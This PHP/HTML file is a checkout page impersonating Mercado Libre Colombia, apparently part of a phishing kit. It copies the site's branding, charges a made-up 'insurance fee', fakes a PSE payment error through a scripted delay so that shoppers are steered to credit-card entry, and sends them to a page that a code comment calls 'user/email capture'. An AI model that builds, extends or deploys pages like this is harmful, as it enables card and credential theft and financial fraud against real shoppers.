<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
require_once __DIR__ . '/../../conexion.php';
require_once __DIR__ . '/../../config.php';
require_once __DIR__ . '/../../token_helper.php';

$token = $_GET['token'] ?? ($_SESSION['landing_token'] ?? '');
$landing_data = null;
if (!empty($token)) {
    $landing_data = obtenerLandingPorToken($token, $pdo);
}

if ($landing_data) {
    $producto = $landing_data['producto'];
    $precio = (int)$landing_data['precio'];
    $landing_slug = $landing_data['slug'];
    $_SESSION['landing_token'] = $token;
} else {
    $producto = isset($_GET['producto']) ? $_GET['producto'] : 'DJI Osmo Pocket 3 Creator Combo Color Negro';
    $precio = isset($_GET['precio']) ? (int)$_GET['precio'] : 1500000;
}

// Variables de precio quemadas según los requerimientos
$precio_descuento = 261900;
$ahorro = 255100;
$anticipo_pagar = 3000;

// Formatear precios
$precio_formateado = number_format($precio, 0, ',', '.');
$anticipo_formateado = number_format($anticipo_pagar, 0, ',', '.');

// Track flow type
setcookie('flow_type', 'mercadopago', time() + 3600, '/');
?>
<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
    <title>Elige cómo pagar - Mercado Libre</title>
    
    <!-- FUENTES MERCADO LIBRE -->
    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600&display=swap" rel="stylesheet">
    
    <style>
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 300;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 400;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 600;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
        }

        :root {
            --ml-yellow: #fff159;
            --ml-blue: #3483fa;
            --ml-blue-hover: #2968c8;
            --ml-text-black: #333333;
            --ml-text-gray: #666666;
            --ml-text-light: #999999;
            --ml-green: #00a650;
            --ml-border: #e6e6e6;
            --ml-bg: #ebebeb;
            --ml-error: #f23d4f;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Proxima Nova', -apple-system, 'Helvetica Neue', Helvetica, Roboto, Arial, sans-serif;
            background-color: var(--ml-bg);
            color: var(--ml-text-black);
            -webkit-font-smoothing: antialiased;
        }

        /* HEADER YOUTUBE-STYLE (CLEAN) */
        .ml-header {
            background-color: var(--ml-yellow);
            height: 60px;
            width: 100%;
            display: flex;
            align-items: center;
        }
        
        .nav-bounds {
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
        }

        .nav-logo {
            width: 134px;
            height: 34px;
            background-image: url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .nav-user {
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        /* MAIN CONTENT */
        .main-container {
            max-width: 1024px;
            margin: 40px auto;
            display: flex;
            gap: 40px;
            padding: 0 20px;
        }

        .left-col {
            flex: 1;
        }
        
        .right-col {
            width: 350px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-top: 0;
            margin-bottom: 24px;
            color: var(--ml-text-black);
        }

        /* CARD SELECTOR */
        .payment-box {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            overflow: hidden;
            margin-bottom: 20px;
        }

        .payment-option {
            display: flex;
            align-items: center;
            padding: 24px;
            border-bottom: 1px solid var(--ml-border);
            cursor: pointer;
            transition: background-color 0.2s;
            position: relative;
        }
        
        .payment-option:hover {
            background: #f7f7f7;
        }
        
        .payment-option:last-child {
            border-bottom: none;
        }
        
        .payment-option.disabled {
            opacity: 0.5;
            cursor: not-allowed;
            pointer-events: none;
        }

        .radio-btn {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            border: 2px solid var(--ml-blue);
            margin-right: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .radio-btn.selected::after {
            content: '';
            width: 10px;
            height: 10px;
            background-color: var(--ml-blue);
            border-radius: 50%;
        }
        
        .radio-btn.unselected {
            border-color: #bfbfbf;
        }

        .payment-icon {
            margin-right: 16px;
        }
        
        .payment-icon img {
            width: 32px;
            height: auto;
        }

        .payment-text {
            font-size: 16px;
            font-weight: 400;
        }

        /* ERROR TOAST */
        .error-message {
            display: none;
            background: var(--ml-error);
            color: #fff;
            padding: 12px 16px;
            border-radius: 6px;
            font-size: 14px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        /* CONTINUE BTN */
        .btn-continue {
            background-color: var(--ml-blue);
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 0 24px;
            height: 48px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            min-width: 150px;
            float: right;
        }
        
        .btn-continue:hover {
            background-color: var(--ml-blue-hover);
        }

        /* SPINNER */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* RESUMEN DE COMPRA */
        .summary-box {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            padding: 24px;
        }

        .summary-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--ml-border);
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            margin-bottom: 12px;
            color: var(--ml-text-gray);
        }
        
        .summary-row.total {
            border-top: 1px solid var(--ml-border);
            padding-top: 16px;
            margin-top: 16px;
            font-size: 16px;
            color: var(--ml-text-black);
            font-weight: 400;
            align-items: center;
        }
        
        .total-price {
            font-size: 24px;
            font-weight: 600;
        }

        .green-text {
            color: var(--ml-green);
        }
        
        .strikethrough {
            text-decoration: line-through;
            color: #bfbfbf;
            margin-right: 8px;
        }

        .savings {
            text-align: right;
            font-size: 12px;
            color: var(--ml-green);
            margin-top: 4px;
        }

        .coupon-link {
            color: var(--ml-blue);
            font-size: 14px;
            cursor: pointer;
            margin-top: 16px;
            display: inline-block;
        }

        /* FOOTER */
        .ml-footer {
            max-width: 1024px;
            margin: 60px auto 20px;
            padding: 0 20px;
            font-size: 12px;
            color: var(--ml-text-gray);
            border-top: 1px solid var(--ml-border);
            padding-top: 20px;
        }

        .ml-footer-links {
            display: flex;
            gap: 20px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }
        
        .ml-footer-links a {
            color: var(--ml-text-black);
            text-decoration: none;
        }

        @media (max-width: 768px) {
            .main-container {
                flex-direction: column-reverse;
                gap: 20px;
                margin-top: 20px;
            }
            .right-col {
                width: 100%;
            }
            .btn-continue {
                width: 100%;
                float: none;
            }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="ml-header">
        <div class="nav-bounds">
            <a href="https://www.mercadolibre.com.co" target="_blank" class="nav-logo"></a>
            <div class="nav-user">
                <a href="https://www.mercadolibre.com.co/ayuda" target="_blank" style="color: #333; text-decoration: none; font-weight: 600;">Ayuda / PQR</a>
            </div>
        </div>
    </header>

    <!-- MAIN -->
    <main class="main-container">
        
        <!-- COLUMNA IZQUIERDA (Métodos) -->
        <div class="left-col">
            
            <div class="error-message" id="errorMsg">
                Temporalmente no podemos procesar pagos con PSE. Por favor, intenta con otro medio de pago.
            </div>

            <h1>Elige cómo pagar</h1>

            <div class="payment-box">
                <!-- TARJETA -->
                <div class="payment-option" id="optCard" onclick="selectOption('card')">
                    <div class="radio-btn unselected" id="radioCard"></div>
                    <div class="payment-icon">
                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="1.5"><rect x="3" y="6" width="18" height="12" rx="2"/><path d="M3 10h18"/></svg>
                    </div>
                    <div class="payment-text">Nueva tarjeta de crédito</div>
                </div>

                <!-- PSE -->
                <div class="payment-option" id="optPse" onclick="selectOption('pse')">
                    <div class="radio-btn selected" id="radioPse"></div>
                    <div class="payment-icon">
                        <img src="../../imagenes/pse.png" alt="PSE" style="width:28px;">
                    </div>
                    <div class="payment-text">Transferencia con PSE</div>
                </div>
            </div>

            <button class="btn-continue" id="btnContinue" onclick="handleContinue()">
                <span id="btnText">Continuar</span>
                <div class="spinner" id="btnSpinner"></div>
            </button>
            
            <div style="clear:both;"></div>
        </div>

        <!-- COLUMNA DERECHA (Resumen) -->
        <div class="right-col">
            <div class="summary-box">
                <div class="summary-title">Resumen de compra</div>
                
                <div class="summary-row">
                    <span>Producto</span>
                    <span class="green-text">$ <?php echo $precio_formateado; ?></span>
                </div>

                <div class="summary-row">
                    <span>Envío</span>
                    <span><span class="strikethrough">$ 13.200</span> <span class="green-text">Gratis</span></span>
                </div>

                <div class="summary-row">
                    <span>Tarifa de seguro contraentrega</span>
                    <span>$ <?php echo $anticipo_formateado; ?></span>
                </div>
                
                <div class="summary-row total">
                    <span>Pagas</span>
                    <div>
                        <span class="total-price">$ <?php echo $anticipo_formateado; ?></span>
                    </div>
                </div>
                
                <div style="background-color: #f0f7fb; border-left: 4px solid #3483fa; border-radius: 4px; padding: 12px; margin-top: 20px; font-size: 13px; color: #333; display: flex; align-items: flex-start; gap: 10px;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink: 0;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
                    <span style="line-height: 1.4;">
                        <strong>Pago en casa:</strong> El valor del producto ($ <?php echo $precio_formateado; ?>) lo pagarás al recibir tu paquete. Lo que pagas ahora es únicamente la tarifa del seguro para despachar tu orden.
                    </span>
                </div>
            </div>
        </div>

    </main>

    <!-- FOOTER -->
    <footer class="ml-footer">
        <div class="ml-footer-links">
            <a href="#">Trabaja con nosotros</a>
            <a href="#">Términos y condiciones</a>
            <a href="#">Promociones</a>
            <a href="#">Cómo cuidamos tu privacidad</a>
            <a href="#">Accesibilidad</a>
            <a href="#">Ayuda / PQR</a>
            <a href="#">Navidad</a>
            <a href="#">www.sic.gov.co</a>
        </div>
        <p>Copyright © 1999-2026 MercadoLibre Colombia LTDA.<br>Calle 100 #7-33, Torre 1, Piso 16, Bogotá D.C., Colombia</p>
    </footer>

    <script>
        let currentSelection = 'pse'; // Default seleccionamos PSE
        
        function selectOption(opt) {
            if (opt === 'pse' && document.getElementById('optPse').classList.contains('disabled')) {
                return; // Prevent selecting disabled PSE
            }
            
            currentSelection = opt;
            
            document.getElementById('radioCard').className = 'radio-btn unselected';
            document.getElementById('radioPse').className = 'radio-btn unselected';
            
            if(opt === 'card') {
                document.getElementById('radioCard').className = 'radio-btn selected';
            } else {
                document.getElementById('radioPse').className = 'radio-btn selected';
            }
        }

        function handleContinue() {
            const btn = document.getElementById('btnContinue');
            const text = document.getElementById('btnText');
            const spinner = document.getElementById('btnSpinner');
            const errorMsg = document.getElementById('errorMsg');
            
            if(currentSelection === 'pse') {
                // Simulate PSE Error
                btn.style.pointerEvents = 'none';
                text.style.display = 'none';
                spinner.style.display = 'block';
                
                setTimeout(() => {
                    btn.style.pointerEvents = 'auto';
                    text.style.display = 'block';
                    spinner.style.display = 'none';
                    
                    // Show error and disable PSE
                    errorMsg.style.display = 'block';
                    document.getElementById('optPse').classList.add('disabled');
                    
                    // Auto select card
                    selectOption('card');
                    
                    window.scrollTo({top: 0, behavior: 'smooth'});
                }, 2500);
                
            } else if(currentSelection === 'card') {
                // Proceed to Card flow (which starts with user/email capture)
                const tokenVal = <?= json_encode($token) ?>;
                const prod = <?= json_encode($producto) ?>;
                if (tokenVal && tokenVal.length > 0) {
                    window.location.href = "usuario.php?token=" + encodeURIComponent(tokenVal);
                } else {
                    window.location.href = "usuario.php?producto=" + encodeURIComponent(prod) + "&precio=<?= (int)$precio ?>";
                }
            }
        }
    </script>
</body>
</html>
